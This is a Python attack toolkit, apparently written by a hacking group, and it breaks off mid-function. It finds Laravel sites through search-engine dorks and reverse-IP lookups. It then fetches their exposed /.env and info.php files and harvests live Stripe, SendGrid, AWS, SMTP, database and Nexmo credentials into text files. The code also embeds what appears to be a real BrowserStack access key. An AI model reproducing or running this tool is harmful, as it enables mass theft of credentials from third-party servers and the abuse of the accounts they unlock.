from json import JSONDecodeError
import urllib
import os, sys
from urllib.parse import urlsplit
import time
import selenium
from datetime import datetime
from selenium import webdriver
import hashlib
import socket
import re
import sys
import socket
import urllib3
import re
import sys
import socket
import urllib3
import smtplib
import os.path
import requests
from os import path
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
import smtplib
import os.path
from os import path
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
import sys, os.path
from urllib.parse import urlparse
import json
from multiprocessing.dummy import Pool as ThreadPool
from urllib.parse import urlparse
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from colorama import Fore, Style
import random
import requests
import threading
import time
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import os,re,requests,ctypes
import sys
import time
from multiprocessing.dummy import Pool
from random import choice
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#init(convert=True)


def getIP(site):
    site = site.strip()
    print(site)
    site = site.split(".")
    print(site)
    try:
        d1 = site[0]
        d2 = site[1]
        d3 = site[-2]
        d4 = site[-1]
        print(d1, d2, d3, d4)
        for p in range(256):
                p1 = f"{d1}.{d2}.{d3}.%d" % p
                print(f"IP RANGED FOR => {p1}")
                file1 = open("ranged-ips.txt", "a")
                file1.write("{}\n".format(p1))
                file1.close()



    except Exception as e:
        print(e)
        print("SOMETHING IS WRONG WITH {}".format(site))
        pass

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")

class settings:
	y = Fore.YELLOW
	r = Fore.RED
	b = Fore.BLUE


def clean():
	lines_seen = set()
	outfile = open('cleanbingsites.txt', "a")
	infile = open('links.txt', "r")
	for line in infile:
		if line not in lines_seen:
			outfile.write(line)
			lines_seen.add(line)
	outfile.close()
	infile.close()
	if os.name == "nt":
		os.system("del sitelist.txt")
	else:
		os.system("rm -rf sitelist.txt")
	print("[{}+{}] Duplicate sites removed successfully!".format(settings.r,settings.y))
	print("\n[{}+{}] Sites saved as {}sites.txt{}!".format(settings.r,settings.y,settings.b,settings.y))


binglist = {"http://www.bing.com/search?q=&count=50&first=1",
"http://www.bing.com/search?q=&count=50&first=51",
"http://www.bing.com/search?q=&count=50&first=101",
"http://www.bing.com/search?q=&count=50&first=151",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.com.br/search?q=&count=50&first=1",
"http://www.bing.com.br/search?q=&count=50&first=51",
"http://www.bing.com.br/search?q=&count=50&first=101",
"http://www.bing.at/search?q=&count=50&first=1",
"http://www.bing.at/search?q=&count=50&first=51",
"http://www.bing.at/search?q=&count=50&first=101",
"http://www.bing.be/search?q=&count=50&first=1",
"http://www.bing.be/search?q=&count=50&first=51",
"http://www.bing.be/search?q=&count=50&first=101",
"http://www.bing.cl/search?q=&count=50&first=1",
"http://www.bing.cl/search?q=&count=50&first=51",
"http://www.bing.cl/search?q=&count=50&first=101",
"http://www.bing.co.at/search?q=&count=50&first=1",
"http://www.bing.co.at/search?q=&count=50&first=51",
"http://www.bing.co.at/search?q=&count=50&first=101",
"http://www.bing.com.au/search?q=&count=50&first=1",
"http://www.bing.com.au/search?q=&count=50&first=51",
"http://www.bing.com.au/search?q=&count=50&first=101",
"http://www.bing.com.cn/search?q=&count=50&first=1",
"http://www.bing.com.cn/search?q=&count=50&first=51",
"http://www.bing.com.cn/search?q=&count=50&first=101",
"http://www.bing.cz/search?q=&count=50&first=1",
"http://www.bing.cz/search?q=&count=50&first=51",
"http://www.bing.cz/search?q=&count=50&first=101",
"http://www.bing.de/search?q=&count=50&first=1",
"http://www.bing.de/search?q=&count=50&first=51",
"http://www.bing.de/search?q=&count=50&first=101",
"http://www.bing.dk/search?q=&count=50&first=1",
"http://www.bing.dk/search?q=&count=50&first=51",
"http://www.bing.dk/search?q=&count=50&first=101",
"http://www.bing.ca/search?q=&count=50&first=1",
"http://www.bing.ca/search?q=&count=50&first=51",
"http://www.bing.ca/search?q=&count=50&first=101",
"http://www.bing.sg/search?q=&count=50&first=1",
"http://www.bing.sg/search?q=&count=50&first=51",
"http://www.bing.sg/search?q=&count=50&first=101",
"http://www.bing.se/search?q=&count=50&first=1",
"http://www.bing.se/search?q=&count=50&first=51",
"http://www.bing.se/search?q=&count=50&first=101",
"http://www.bing.pl/search?q=&count=50&first=1",
"http://www.bing.pl/search?q=&count=50&first=51",
"http://www.bing.pl/search?q=&count=50&first=101",
"http://www.bing.no/search?q=&count=50&first=1",
"http://www.bing.no/search?q=&count=50&first=51",
"http://www.bing.no/search?q=&count=50&first=101",
"http://www.bing.nl/search?q=&count=50&first=1",
"http://www.bing.nl/search?q=&count=50&first=51",
"http://www.bing.nl/search?q=&count=50&first=101",
"http://www.bing.net.nz/search?q=&count=50&first=1",
"http://www.bing.net.nz/search?q=&count=50&first=51",
"http://www.bing.net.nz/search?q=&count=50&first=101",
"http://www.bing.lv/search?q=&count=50&first=1",
"http://www.bing.lv/search?q=&count=50&first=51",
"http://www.bing.lv/search?q=&count=50&first=101",
"http://www.bing.lt/search?q=&count=50&first=1",
"http://www.bing.lt/search?q=&count=50&first=51",
"http://www.bing.lt/search?q=&count=50&first=101",
"http://www.bing.it/search?q=&count=50&first=1",
"http://www.bing.it/search?q=&count=50&first=51",
"http://www.bing.it/search?q=&count=50&first=101",
"http://www.bing.is/search?q=&count=50&first=1",
"http://www.bing.is/search?q=&count=50&first=51",
"http://www.bing.is/search?q=&count=50&first=101",
"http://www.bing.in/search?q=&count=50&first=1",
"http://www.bing.in/search?q=&count=50&first=51",
"http://www.bing.in/search?q=&count=50&first=101",
"http://www.bing.ie/search?q=&count=50&first=1",
"http://www.bing.ie/search?q=&count=50&first=51",
"http://www.bing.ie/search?q=&count=50&first=101",
"http://www.bing.hu/search?q=&count=50&first=1",
"http://www.bing.hu/search?q=&count=50&first=51",
"http://www.bing.hu/search?q=&count=50&first=101",
"http://www.bing.fr/search?q=&count=50&first=1",
"http://www.bing.fr/search?q=&count=50&first=51",
"http://www.bing.fr/search?q=&count=50&first=101",
"http://www.bing.com.sg/search?q=&count=50&first=1",
"http://www.bing.com.sg/search?q=&count=50&first=51",
"http://www.bing.com.sg/search?q=&count=50&first=101",
"http://www.bing.co.uk/search?q=&count=50&first=1",
"http://www.bing.co.uk/search?q=&count=50&first=51",
"http://www.bing.co.uk/search?q=&count=50&first=101",
"http://www.bing.co.nz/search?q=&count=50&first=1",
"http://www.bing.co.nz/search?q=&count=50&first=51",
"http://www.bing.co.nz/search?q=&count=50&first=101",
"http://www.bing.co.jp/search?q=&count=50&first=1",
"http://www.bing.co.jp/search?q=&count=50&first=51",
"http://www.bing.co.jp/search?q=&count=50&first=101",
"http://www.bing.ch/search?q=&count=50&first=1",
"http://www.bing.ch/search?q=&count=50&first=51",
"http://www.bing.ch/search?q=&count=50&first=101",
"http://www.bing.com.tr/search?q=&count=50&first=1",
"http://www.bing.com.tr/search?q=&count=50&first=51",
"http://www.bing.com.tr/search?q=&count=50&first=101",
"http://www.bing.com.pr/search?q=&count=50&first=1",
"http://www.bing.com.pr/search?q=&count=50&first=51",
"http://www.bing.com.pr/search?q=&count=50&first=101",
"http://www.bing.com.ar/search?q=&count=50&first=1",
"http://www.bing.com.ar/search?q=&count=50&first=51",
"http://www.bing.com.ar/search?q=&count=50&first=101",
"http://www.bing.com.co/search?q=&count=50&first=1",
"http://www.bing.com.co/search?q=&count=50&first=51",
"http://www.bing.com.co/search?q=&count=50&first=101",
"http://www.bing.com.es/search?q=&count=50&first=1",
"http://www.bing.com.es/search?q=&count=50&first=51",
"http://www.bing.com.es/search?q=&count=50&first=101",
"http://www.bing.fi/search?q=&count=50&first=1",
"http://www.bing.fi/search?q=&count=50&first=51",
"http://www.bing.fi/search?q=&count=50&first=101",
"http://www.bing.bo/search?q=&count=50&first=1",
"http://www.bing.bo/search?q=&count=50&first=51",
"http://www.bing.bo/search?q=&count=50&first=101",
"http://www.bing.com.do/search?q=&count=50&first=1",
"http://www.bing.com.do/search?q=&count=50&first=51",
"http://www.bing.com.do/search?q=&count=50&first=101",
"http://www.bing.gr/search?q=&count=50&first=1",
"http://www.bing.gr/search?q=&count=50&first=51",
"http://www.bing.gr/search?q=&count=50&first=101",
"http://www.bing.com.hk/search?q=&count=50&first=1",
"http://www.bing.com.hk/search?q=&count=50&first=51",
"http://www.bing.com.hk/search?q=&count=50&first=101",
"http://www.bing.com.hr/search?q=&count=50&first=1",
"http://www.bing.com.hr/search?q=&count=50&first=51",
"http://www.bing.com.hr/search?q=&count=50&first=101",
"http://www.bing.com.mx/search?q=&count=50&first=1",
"http://www.bing.com.mx/search?q=&count=50&first=51",
"http://www.bing.com.mx/search?q=&count=50&first=101",
"http://www.bing.com.my/search?q=&count=50&first=1",
"http://www.bing.com.my/search?q=&count=50&first=51",
"http://www.bing.com.my/search?q=&count=50&first=101",
"http://www.bing.ph/search?q=&count=50&first=1",
"http://www.bing.ph/search?q=&count=50&first=51",
"http://www.bing.ph/search?q=&count=50&first=101",
"http://www.bing.com.pr/search?q=&count=50&first=1",
"http://www.bing.com.pr/search?q=&count=50&first=51",
"http://www.bing.com.pr/search?q=&count=50&first=101",
"http://www.bing.pt/search?q=&count=50&first=1",
"http://www.bing.pt/search?q=&count=50&first=51",
"http://www.bing.pt/search?q=&count=50&first=101",
"http://www.bing.com.ro/search?q=&count=50&first=1",
"http://www.bing.com.ro/search?q=&count=50&first=51",
"http://www.bing.com.ro/search?q=&count=50&first=101",
"http://www.bing.ru/search?q=&count=50&first=1",
"http://www.bing.ru/search?q=&count=50&first=51",
"http://www.bing.ru/search?q=&count=50&first=101",
"http://www.bing.com.sa/search?q=&count=50&first=1",
"http://www.bing.com.sa/search?q=&count=50&first=51",
"http://www.bing.com.sa/search?q=&count=50&first=101",
"http://www.bing.si/search?q=&count=50&first=1",
"http://www.bing.si/search?q=&count=50&first=51",
"http://www.bing.si/search?q=&count=50&first=101",
"http://www.bing.sk/search?q=&count=50&first=1",
"http://www.bing.sk/search?q=&count=50&first=51",
"http://www.bing.sk/search?q=&count=50&first=101",
"http://www.bing.com.ua/search?q=&count=50&first=1",
"http://www.bing.com.ua/search?q=&count=50&first=51",
"http://www.bing.com.ua/search?q=&count=50&first=101",
"http://www.bing.com.uy/search?q=&count=50&first=1",
"http://www.bing.com.uy/search?q=&count=50&first=51",
"http://www.bing.com.uy/search?q=&count=50&first=101",
"http://www.bing.vn/search?q=&count=50&first=1",
"http://www.bing.vn/search?q=&count=50&first=51",
"http://www.bing.vn/search?q=&count=50&first=101"}
site = 0
error = 0
def dorkscan(dork):
	global site,error
	for bing in binglist:
		bingg = bing.replace("&count",dork + "&count")
		try:
		  x = requests.session()
		  r = x.get(bingg)
		  x.proxies = {'http': 'socks4://{}'.format(choice(proxy)),'https': 'socks4://{}'.format(choice(proxy))}
		  checktext = r.text
		  checktext = checktext.replace("<strong>","")
		  checktext = checktext.replace("</strong>","")
		  checktext = checktext.replace('<span dir="ltr">','')
		  checksites = re.findall('<cite>(.*?)</cite>',checktext)
		  for sites in checksites:
		  	#site = site + 1
		  	sites = sites.replace("http://","protocol1")
		  	sites = sites.replace("https://","protocol2")
		  	sites = sites + "/"
		  	site = sites[:sites.find("/")+0]
		  	site = site.replace("protocol1","http://")
		  	site = site.replace("protocol2","https://")
		  	site = site.replace('<span class="" dir="ltr">','')
		  	if "http" in site:
		  		print(site + "/")
		  	else:
		  		print("http://" + site + "/")
		  	try:
		  		with open("links.txt","a") as f:
		  			if "http" in site:
		  				f.write(site + "/" + "\n")
		  			else:
		  				f.write("http://" + site + "/" + "\n")
		  	except:
		  		pass
		except:
			pass


ROOT = "https://www.google.com/"


def log(msg):
    timer = datetime.now().strftime("%H:%M:%S")
    print(f'{Fore.GREEN} [{timer}] Worker:{Style.RESET_ALL} {msg}')


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def searchings():
    query = input(f'{Fore.GREEN}[+] Query: {Style.RESET_ALL}')
    return query

start = 0
def banner():
    clear()
    print(Fore.RED + f"""
                                    ██████  ██ ▄█▀  █████▒▓██   ██▓
                                    ▒██    ▒  ██▄█▒ ▓██   ▒  ▒██  ██▒
                                    ░ ▓██▄   ▓███▄░ ▒████ ░   ▒██ ██░
                                      ▒   ██▒▓██ █▄ ░▓█▒  ░   ░ ▐██▓░
                                    ▒██████▒▒▒██▒ █▄░▒█░      ░ ██▒▓░
                                    ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒ ▒ ░       ██▒▒▒ 
                                    ░ ░▒  ░ ░░ ░▒ ▒░ ░       ▓██ ░▒░ 
                                    ░  ░  ░  ░ ░░ ░  ░ ░     ▒ ▒ ░░  
                                          ░  ░  ░            ░ ░     
                                                             ░ ░     
                             {Fore.BLUE}coded by @AnonSidd for Team Hunter (also gunnu)!
                         """)

class UltraDorker:


    def __init__(self):
        self.query = None
        caps = {
            'os_version': '10',
            'os': 'Windows',
            'browser': 'chrome',
            'browser_version': '101.0',
            'name': 'Parallel Test1',  # test name
            'build': 'browserstack-build-1'  # Your tests will be organized within this build
        }


        self.driver = webdriver.Remote(
            command_executor='https://ads_CeKJ7P:86xcojpxvAq3QzCb9rSz@hub-cloud.browserstack.com/wd/hub',
            desired_capabilities=caps)

    def parseUrl(self, site):
        root = urlparse(site).netloc
        return f'https://{root}'

    def extractLinks(self, results):
        try:
            for result in results:
                dump = result.text.strip().split(' ')
                for text in dump:
                    if 'https' in text:
                        try:
                            site = text.split("\n")[1]
                            print("saved {} to links.txt".format(site))
                            file1 = open("links.txt", "a")
                            file1.write("{} \n".format(site))
                            file1.close()
                        except IndexError:
                            pass
                    elif 'http' in text:
                        try:
                            site = text.split("\n")[1]
                            print("saved {} to links.txt".format(site))
                            file1 = open("links.txt", "a")
                            file1.write("{} \n".format(site))
                            file1.close()
                        except IndexError:
                            pass
        except Exception as e:
            print(e)
            pass

    def google_search(self, query):
        self.query = query
        self.get_results(query)

    def recaptcha(self, url):
        try:
            print(url)
            self.driver.get(url)
        except:
            print('If you are seeing this message thn your luck is even worst than mine')


    def get_results(self, query, url=None):
        global start
        try:
            query = urllib.parse.quote_plus(query)
            if url is None:
                start = 0
                url = f"https://google.com/search?q={query}&start={start}&num=100&filter=0"
                self.driver.get(url)
            else:
                self.driver.get(url)

            WebDriverWait(self.driver, 15).until(EC.presence_of_all_elements_located((By.XPATH, '//*[@id="gsr"]')))
            results = self.driver.find_elements(By.XPATH, '//*[@id="gsr"]')
            self.extractLinks(results)

            while True:
                try:
                    self.driver.find_element(By.XPATH, '//*[@id="pnnext"]')
                    print(f'{Fore.GREEN}[+] {Style.RESET_ALL}NEXT PAGE!')
                except selenium.common.exceptions.NoSuchElementException:
                    self.driver.quit()
                    print(f'{Fore.GREEN}[+] {Style.RESET_ALL}Done!')
                    break


                start = start + 100
                self.driver.get(f"https://google.com/search?q={query}&start={start}&num=100&filter=0")
                WebDriverWait(self.driver, 15).until(EC.presence_of_all_elements_located((By.XPATH, '//*[@id="gsr"]')))
                results = self.driver.find_elements(By.XPATH, '//*[@id="gsr"]')
                self.extractLinks(results)
                cul = self.driver.current_url
                open('cul.txt', 'w').write(cul)


        except JSONDecodeError as e:
            print('#ERROR:\n', e)
        except selenium.common.exceptions.TimeoutException:
            cul = open("cul.txt", "r")
            cul = cul.read()
            self.driver.quit()
            self.__init__()
            print('prblm')
            print(cul)
            self.recaptcha(cul)

    banner()



os.system("clear")
print(Fore.RED + f"""
                                    ██████  ██ ▄█▀  █████▒▓██   ██▓
                                    ▒██    ▒  ██▄█▒ ▓██   ▒  ▒██  ██▒
                                    ░ ▓██▄   ▓███▄░ ▒████ ░   ▒██ ██░
                                      ▒   ██▒▓██ █▄ ░▓█▒  ░   ░ ▐██▓░
                                    ▒██████▒▒▒██▒ █▄░▒█░      ░ ██▒▓░
                                    ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒ ▒ ░       ██▒▒▒ 
                                    ░ ░▒  ░ ░░ ░▒ ▒░ ░       ▓██ ░▒░ 
                                    ░  ░  ░  ░ ░░ ░  ░ ░     ▒ ▒ ░░  
                                          ░  ░  ░            ░ ░     
                                                             ░ ░     
                             {Fore.BLUE}coded by @AnonSidd for Team Hunter (also gunnu)!
                         """)

print(Fore.RED + '[+] Choose the type :-')
print()
print(Fore.YELLOW + """    [1] Dorker
    [2] Duplicate remover
    [3] Url to domain
    [4] Ip from domain
    [5] Ip ranger
    [6] Laravel detection
    [7] Reverse ip
    [8] Laravel scanner
    
""")
print()
x = input(Fore.CYAN + '>> ')

if x == '3':
    from urllib.parse import urlsplit
    banner()
    inp = input(Fore.CYAN + 'Url file name >> ')
    url = open(inp, 'r')
    for links in url:
        foo = urlsplit(links)
        print(f'https://{foo.netloc} | @AnonSidd')
        domain = (f'https://{foo.netloc}')
        hmm = open('domains.txt', "a")
        hmm.write(f'{domain}\n')
    print()
    print(Fore.GREEN + 'Saved in domains.txt')

if x == '1':
  nam = input(Fore.CYAN + 'Dork file name >> ')
  print()
  pro = input(Fore.CYAN + 'Socks4 proxy file name >> ')
  try:
    with open(nam) as f:
        for i in f:
            dorker = UltraDorker()
            dorker.google_search(i)
  except KeyboardInterrupt:
      print(Fore.RED + '\n[!] Exiting...' + Style.RESET_ALL)
  try:
    def ok():
      global proxy
    #inp = input('Enter proxy : ')
    #wit = open(inp,'r',errors='ignore').read().splitlines()
      dorks = open(nam, 'r',errors='ignore').read().splitlines()
      #pro = input('[*] Proxy Socks 4 : ')
      prox = open(pro,'r',errors='ignore').read().splitlines()
      proxy = [items.strip() for items in prox]
      print("[{}+{}] Scan started! Please wait... :)".format(settings.r,settings.y))
      pp = Pool(50)
      pr = pp.map(dorkscan,dorks)
    ok()
  except:
    print('your luck is bad')
  
if x == '5':
  print()
  nam = input(Fore.CYAN + 'Ip list file name >> ')
  a = open(nam, "r")
  for site in a:
    x = threading.Thread(target=getIP, args=(site, ))
    x.start()
    time.sleep(0.02)
    print("SAVED IN ranged-ip.txt")

if x == '7':
  banner()
  print(Fore.RED + '[+] Choose the type :-')
  print(Fore.YELLOW + """    [1] Reverse IP
    [2] Reverse IP with Subdomain""")
  select = input(">> ")
  
  if select == "1":
            def cut(text='',leng=False):
                if leng == False:
                    ret = text
                else:
                    length_string = len(text)
                    if length_string > leng:
                        ret = text[0:leng]
                    else:

                        neko = leng-length_string
                        ret = text+' '*neko
                    return str(ret)

            def revip(target):
                try:
                    getdom = requests.get("https://sonar.omnisint.io/reverse/" + target)
                    if "null" in getdom.text:
                        print ("[?] "+cut(target, 15)+" {}=> ".format(Fore.WHITE) +"{}Maybe Domains Down".format(Fore.RED))
                    else:
                        result = json.loads(getdom.text)
                        print ("[+] {} => {} Domains".format(cut(str(target) ,15), len(result)))
                        for domain in result:
                            open('Reverse.txt', 'a').write('http://' + domain + "\n")
                except:
                    pass
            print ("{}Reverse IP".format(Fore.RED))
            print("===============================")
            os.system('dir' if os.name == 'nt' else 'ls')
            target = open(input(Fore.WHITE+'List:~# '),'r').read().replace('http://', '').replace('https://', '').splitlines()
            Thread = input(Fore.WHITE+'Thread:~# ')
            pool = ThreadPool(int(Thread))
            pool.map(revip, target)
            pool.close()
            pool.join()
            print("===============================")
            count_result = len(open("Reverse.txt").readlines())
            print("[ + ] Total Result : "+str(count_result))
  elif select == "2":
      def cut(text='',leng=False):
          if leng == False:
              ret = text
          else:
              length_string = len(text)
              if length_string > leng:
                  ret = text[0:leng]
              else:
                  neko = leng-length_string
                  ret = text+' '*neko
              return str(ret)
      def revip(target):
          try:
              getdom = requests.get("https://sonar.omnisint.io/reverse/" + target and "https://sonar.omnisint.io/subdomains/" + target)
              if "null" in getdom.text:
                  print ("[?] "+cut(target, 15)+" {}=> ".format(Fore.WHITE) +"{}Maybe Domains Down".format(Fore.RED))
              else:
                  result = json.loads(getdom.text)
                  print ("[+] {} => {} Domains".format(cut(str(target) ,15), len(result)))
                  for domain in result:
                      open('Reverse.txt', 'a').write('http://' + domain + "\n")
          except:
              pass
      print ("{}Reverse IP And Subdomain Scanner".format(Fore.RED))
      print("===============================")
      os.system('dir' if os.name == 'nt' else 'ls')
      target = open(input(Fore.WHITE+'List:~# '),'r').read().replace('http://', '').replace('https://', '').splitlines()
      Thread = input(Fore.WHITE+'Thread:~# ')
      pool = ThreadPool(int(Thread))
      pool.map(revip, target)
      pool.close()
      pool.join()
      print("===============================")
      count_result = len(open("Reverse.txt").readlines())
      print("[ + ] Total Result : "+str(count_result))

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}

def check(site):
    if '://' not in site:
        site = 'http://' + site
    site = site.replace('\n', '').replace('\r', '')
    site = site.strip()
    site1 = site + '/.env',
    site2 = site + '/info.php'
    try:
        req = requests.get(site1, headers=headers, timeout=5)
        req2 = requests.get(site2, headers=headers, timeout=5)
        yes = req.text
        yes2 = req2.text
        try:
            if 'sk_live' in yes:
                print('got an site stored in sk_env.txt')
                hmm = open("sk_env.txt", "a")
                hmm.write(f'{site}\n')
            else:
                print('did not found sk_live')
        except:
            pass
        try:
            if 'sk_live' in yes2:
                print('got an site stored in sk_php.txt')
                hmm2 = open('sk_php.txt', 'a')
                hmm2.write(f'{site}\n')
        except:
            pass
                

    except Exception as excep:
        print(f"{site} is down.")
        print(excep)
if x == '6':
    banner()
    print()
    b = input(Fore.CYAN + 'Ip list >> ')
    a = open(b, "r")
    for site in a:
        time.sleep(0.05)
        x = threading.Thread(target=check, args=(site, ))
        x.start()


def getIP(site):
    site = i.strip()
    domain = urlparse(site).netloc
    try:
        IP1 = socket.gethostbyname(domain)
        print(IP1)
        open('ips.txt', 'a').write(IP1 + '\n')

    except:
        print("{} is down".format(domain))
        pass


if x == '4':
    banner()
    print()
    nam = input(Fore.CYAN + 'Your list >> ')
    with open(nam) as f:
        for i in f:
            getIP(i)

if x == '2':
    banner()
    output_file_path = "duplicates-removed.txt"
    input_file_path = input(Fore.CYAN + "File to remove dupli >> ")

    completed_lines_hash = set()
    output_file = open(output_file_path, "w")

    for line in open(input_file_path, "r"):
        
        hashValue = hashlib.md5(line.rstrip().encode('utf-8')).hexdigest()
        if hashValue not in completed_lines_hash:
            output_file.write(line)
            
            completed_lines_hash.add(hashValue)
            
    print(Fore.GREEN + "The result file was saved in duplicates-removed.txt")
    output_file.close()
    
    
    
    
    
if x == '8':
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate'}


class Bot:
    def ENVExtractor(self, argFile):
        def SMTP(argFile):
            DataSMTP = []
            mail_host = []
            mail_port = []
            mail_user = []
            mail_pass = []

            for i in argFile:
                if 'MAIL_' in i:
                    try:
                        if 'MAIL_HOST' in i:
                            mailHost = i.split('=')[1].strip()
                            mail_host.append(mailHost)
                        if 'MAIL_PORT' in i:
                            mailPort = i.split('=')[1].strip()
                            mail_port.append(mailPort)
                        if 'MAIL_USERNAME' in i:
                            mailUser = i.split('=')[1].strip()
                            mail_user.append(mailUser)
                        if 'MAIL_PASSWORD' in i:
                            mailPass = i.split('=')[1].strip()
                            mail_pass.append(mailPass)
                    except:
                        continue
            
            for i in range(len(mail_host)):
                try:
                    add_data = {}
                    add_data['MAIL_HOST'] = mail_host[i]
                    add_data['MAIL_PORT'] = mail_port[i]
                    add_data['MAIL_USERNAME'] = mail_user[i]
                    add_data['MAIL_PASSWORD'] = mail_pass[i]
                    DataSMTP.append(add_data)
                except:
                    continue
            
            for SMTP in DataSMTP:
                if SMTP['MAIL_USERNAME'] == 'apikey':
                    if SMTP['MAIL_PASSWORD'].startswith('SG.'):
                        print(f"\033[32;1mSendgrid APIKEY \033[34;1m: \033[37;1m{SMTP['MAIL_PASSWORD']}\033[0m")
                        with open('scanner/sendgrid.txt', 'a+') as output:
                            output.write(f"{SMTP['MAIL_PASSWORD']}\n")
            
                if SMTP['MAIL_USERNAME'] != '' and SMTP['MAIL_USERNAME'] != ' ' and SMTP['MAIL_USERNAME'] != 'null' and 'mailtrap' not in SMTP['MAIL_HOST'] and not SMTP['MAIL_PASSWORD'].startswith('SG.') and 'localhost' not in SMTP['MAIL_HOST']:
                    print(f"\033[32;1m[*] SMTP DETAIL \033[34;1m: \n\033[37;1m{SMTP['MAIL_HOST']}\033[34;1m|\033[37;1m{SMTP['MAIL_PORT']}\033[34;1m|\033[37;1m{SMTP['MAIL_USERNAME']}\033[34;1m|\033[37;1m{SMTP['MAIL_PASSWORD']}\033[0m")
                    with open('scanner/smtps.txt', 'a+') as output:
                        output.write(f"{SMTP['MAIL_HOST']}|{SMTP['MAIL_PORT']}|{SMTP['MAIL_USERNAME']}|{SMTP['MAIL_PASSWORD']}\n")

        def AWS(argFile):
            AWSData = []
            aws_key = []
            aws_secret = []
            aws_region = []


            for i in argFile:
                try:
                    if 'AWS_' in i:
                        if 'AWS_KEY' in i:
                            awsKEY = i.split('=')[1].strip()
                            aws_key.append(awsKEY)
                        if 'AWS_SECRET' in i:
                            awsSECRET = i.split('=')[1].strip()
                            aws_secret.append(awsSECRET)
                        if 'AWS_REGION' in i:
                            awsREGION = i.split('=')[1].strip()
                            aws_region.append(awsREGION)
                except:
                    continue

            for i in range(len(aws_key)):
                try:
                    data_add = {}
                    data_add['AWS_KEY'] = aws_key[i]
                    data_add['AWS_SECRET'] = aws_secret[i]
                    data_add['AWS_REGION'] = aws_region[i]
                    AWSData.append(data_add)
                except:
                    continue

            for AWS_ in AWSData:
                try:
                    if AWS_['AWS_KEY'] != '' and AWS_['AWS_SECRET'] != '' and AWS_['AWS_KEY'] != ' ' and AWS_['AWS_SECRET'] != ' ':
                        print(f"\033[32;1m[*] Amazon Key \033[34;1m: \033[37;1m{AWS_['AWS_KEY']}\033[34;1m|\033[37;1m{AWS_['AWS_SECRET']}\033[34;1m|\033[37;1m{AWS_['AWS_REGION']}\033[0m")
                        with open('scanner/awskeys.txt', 'a+') as output:
                            output.write(f"{AWS_['AWS_KEY']}|{AWS_['AWS_SECRET']}|{AWS_['AWS_REGION']}\n")
                    else:
                        pass
                except:
                    continue

        def DB(argFile):
            DBData = []
            db_host = []
            db_port = []
            db_user = []
            db_pass = []


            for i in argFile:
                try:
                    if 'DB_' in i:
                        if 'DB_HOST' in i:
                            dbHOST = i.split('=')[1].strip()
                            db_host.append(dbHOST)
                        if 'DB_PORT' in i:
                            dbPORT = i.split('=')[1].strip()
                            db_port.append(dbPORT)
                        if 'DB_USERNAME' in i:
                            dbUSER = i.split('=')[1].strip()
                            db_user.append(dbUSER)
                        if 'DB_PASSWORD' in i:
                            dbPASS = i.split('=')[1].strip()
                            db_pass.append(dbPASS)

                except:
                    continue

            for i in range(len(db_host)):
                try:
                    data_add = {}
                    data_add['DB_HOST'] = db_host[i]
                    data_add['DB_PORT'] = db_port[i]
                    data_add['DB_USERNAME'] = db_user[i]
                    data_add['DB_PASSWORD'] = db_pass[i]
                    DBData.append(data_add)
                except:
                    continue

            for DB in DBData:
                try:
                    if DB['DB_HOST'] != 'localhost' and DB['DB_HOST'] != '127.0.0.1' and DB['DB_HOST'] != '' and DB['DB_HOST'] != ' ' and DB['DB_HOST'] != 'null' and '127.0.0.1' not in DB['DB_HOST'] and 'localhost' not in DB['DB_HOST'] and 'null' not in DB['DB_HOST']:
                        print(f"\033[32;1m[*] \033[32;1mDatabase: \033[37;1m{DB['DB_HOST']}\033[34;1m|\033[37;1m{DB['DB_PORT']}\033[34;1m|\033[37;1m{DB['DB_USERNAME']}\033[34;1m|\033[37;1m{DB['DB_PASSWORD']}\033[0m")
                        with open('scanner/database_valid.txt', 'a+') as output:
                            output.write(f"{DB['DB_HOST']}|{DB['DB_PORT']}|{DB['DB_USERNAME']}|{DB['DB_PASSWORD']}\n")
                    else:
                        pass
                except:
                    pass
        
        def NEXMO(argFile):
            NEXMOData = []
            nexmo_key = []
            nexmo_secret  = []

            for i in argFile:
                try:
                    if 'NEXMO_' in i:
                        if 'NEXMO_KEY' in i:
                            nexmoKEY = i.split('=')[1].strip()
                            nexmo_key.append(nexmoKEY)
                        if 'NEXMO_SECRET' in i:
                            nexmoSECRET = i.split('=')[1].strip()
                            nexmo_secret.append(nexmoSECRET)
                except:
                    continue

            for i in range(len(nexmo_key)):
                try:
                    data_add = {}
                    data_add['NEXMO_KEY'] = nexmo_key[i]
                    data_add['NEXMO_SECRET'] = nexmo_secret[i]
                    NEXMOData.append(data_add)
                except:
                    continue

            for NEXMO in NEXMOData:
                try:
                    if NEXMO['NEXMO_KEY'] != ' ' and NEXMO['NEXMO_KEY'] != '' and NEXMO['NEXMO_SECRET'] != '' and NEXMO['NEXMO_SECRET'] != ' ':
                        print(f"\033[37;1m{NEXMO['NEXMO_KEY']}\033[34;1m|\033[37;1m{NEXMO['NEXMO_SECRET']}\033[0m")
                        with open('scanner/nexmo_creds.txt', 'a+') as output:
                            output.write(f"{NEXMO['NEXMO_KEY']}|{NEXMO['NEXMO_SECRET']}\n")

                    else:
                        pass
                except:
                    pass

        def AWS1(argFile):
            AWSData = []
            aws_key = []
            aws_secret = []
            aws_region = []


            for i in argFile:
                try:
                    if 'AWS_' in i:
                        if 'AWS_ACCESS_KEY_ID' in i:
                            awsKEY = i.split('=')[1].strip()
                            aws_key.append(awsKEY)
                        if 'AWS_SECRET_ACCESS_KEY' in i:
                            awsSECRET = i.split('=')[1].strip()
                            aws_secret.append(awsSECRET)
                        if 'AWS_DEFAULT_REGION' in i:
